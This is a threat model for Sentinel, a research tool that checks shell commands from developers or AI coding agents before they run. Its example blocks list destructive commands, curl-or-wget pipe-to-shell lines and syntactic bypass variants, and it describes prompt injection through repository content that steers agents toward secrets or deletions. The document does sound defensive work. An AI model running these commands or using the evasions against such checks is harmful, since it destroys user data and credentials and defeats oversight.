# Sentinel Threat Model

## Purpose

This document defines what the initial Sentinel research prototype attempts to protect, what it trusts, and what remains outside its scope.

Sentinel is an analysis tool, not a complete sandbox.

## Protected assets

Sentinel aims to reduce accidental or agent-induced damage to:

* project source code;
* uncommitted work;
* Git history;
* protected branches;
* project data;
* local credentials;
* selected system files;
* developer time and trust.

## Actors

### Human developer

May accidentally run a destructive command or approve an unsafe suggestion.

### AI coding agent

May propose or attempt a damaging command because of:

* incorrect reasoning;
* incomplete context;
* prompt injection;
* tool misuse;
* overconfident execution;
* misunderstanding of user intent.

### Malicious repository content

A repository may contain instructions designed to influence an AI agent into:

* reading secrets;
* deleting files;
* modifying CI configuration;
* downloading and executing code;
* pushing destructive changes.

### Malicious command input

The input command may intentionally attempt to bypass detection through:

* whitespace variation;
* alternate flag order;
* absolute executable paths;
* wrappers;
* chaining;
* pipes;
* quoting;
* nested shells;
* path traversal;
* symbolic links.

## Trust boundaries

```text
User or AI agent
        ↓
Untrusted command string
        ↓
Sentinel parser
        ↓
Deterministic analysis core
        ↓
Local filesystem and Git metadata
        ↓
Analysis result
```

Untrusted inputs include:

* command strings;
* file names;
* directory structures;
* repository metadata;
* benchmark cases;
* symbolic links.

## Security assumptions

The initial prototype assumes:

* Sentinel itself runs under the current user account;
* the local operating system and Rust runtime are not compromised;
* Git commands used for context collection behave correctly;
* analysis is performed before execution;
* benchmark fixtures are isolated;
* Sentinel has sufficient read access to relevant metadata.

## Threats addressed

### Obvious destructive commands

Examples:

```bash
rm -rf src
rm -rf ~/.ssh
git reset --hard
git push --force origin main
```

### Context-sensitive false positives

Examples:

```bash
rm -rf target
rm -rf build
```

These may be legitimate when they contain only generated output.

### Loss of uncommitted work

Examples:

```bash
git reset --hard
git clean -fd
rm -rf src
```

### Protected-branch damage

Examples:

```bash
git push --force origin main
git branch -D production
```

### Download and execute

Examples:

```bash
curl https://example.com/install.sh | bash
wget -qO- https://example.com/script | sh
```

### Common syntactic bypasses

Examples:

```bash
rm    -rf src
rm -r -f src
/bin/rm -rf src
sudo rm -rf src
echo safe && rm -rf src
```

## Threats partially addressed

### Nested shell commands

Example:

```bash
bash -c "rm -rf src"
```

The initial parser may support common literal nested shells but not all dynamic shell construction.

### Symbolic links

Sentinel should detect symbolic links and avoid following them during traversal.

It may not fully predict every effect of a command that manipulates symbolic links.

### Path traversal

Sentinel should normalize paths and identify targets outside the project.

It may not fully model shell expansion or runtime path changes.

### Large repositories

Filesystem traversal limits may cause partial context.

Partial context must be reported and must not silently produce a safe decision.

## Threats not addressed in the initial version

### Arbitrary script semantics

Sentinel does not understand everything performed by:

```bash
python script.py
node script.js
./cleanup.sh
```

A safe-looking command may invoke destructive code.

### Malicious executables

Sentinel cannot guarantee that a binary named `cargo`, `git`, or `ls` behaves normally.

### Shell aliases and functions

User-defined aliases and functions may change command behavior.

### Runtime behavior

Sentinel does not initially monitor:

* spawned subprocesses;
* file operations after execution;
* network activity;
* privilege escalation after execution;
* container escape;
* kernel-level actions.

### Remote systems

Sentinel does not fully model commands executed through:

* SSH;
* remote Docker contexts;
* Kubernetes clusters;
* cloud APIs;
* remote CI environments.

### User intent

Sentinel cannot know with certainty whether a destructive operation is intentional.

It estimates operational risk, not semantic intent.

### Complete POSIX shell support

The initial parser will not fully support:

* command substitution;
* complex variable expansion;
* shell functions;
* process substitution;
* advanced redirection;
* dynamically constructed commands;
* every quoting edge case.

### Social engineering

Sentinel cannot prevent a user from explicitly approving a dangerous action.

## Failure modes

### False positive

A legitimate command is classified as dangerous.

Impact:

* interrupted workflow;
* warning fatigue;
* reduced user trust.

Primary research goal:

Measure whether filesystem and Git context reduce this problem.

### False negative

A dangerous command is classified as legitimate.

Impact:

* data loss;
* credential loss;
* repository corruption;
* unsafe agent execution.

False negatives affecting critical assets must receive priority during error analysis.

### Context collection failure

Filesystem or Git information may be unavailable.

Sentinel must:

* indicate incomplete context;
* avoid silently treating missing context as evidence of safety;
* use a documented fallback behavior.

### Parser mismatch

The parser may interpret a command differently from the shell.

Sentinel must:

* reject unsupported syntax when practical;
* document known differences;
* avoid claiming complete shell equivalence.

## Safety controls

* analysis-only mode by default;
* no command execution during research benchmarks;
* isolated temporary fixtures;
* no symbolic-link following during traversal;
* traversal limits;
* read-only Git inspection;
* deterministic rules;
* explicit unsupported-syntax handling;
* structured findings;
* regression tests for confirmed bypasses.

## Data privacy

Sentinel should operate locally.

The initial version must not:

* upload commands;
* upload paths;
* upload repository metadata;
* upload file contents;
* call an external LLM.

Logs and benchmark results must avoid secret contents.

## Security claims

Acceptable claim:

> Sentinel evaluates a defined subset of shell commands using deterministic command, filesystem, and Git features.

Unacceptable claims:

> Sentinel makes AI agents safe.

> Sentinel prevents all destructive commands.

> Sentinel fully understands shell behavior.

## Vulnerability reporting

Before public release, create `SECURITY.md` containing:

* supported versions;
* private reporting contact;
* responsible disclosure expectations;
* known scope limitations.

Security-sensitive issues should not initially be disclosed through public GitHub issues when they enable practical bypasses.
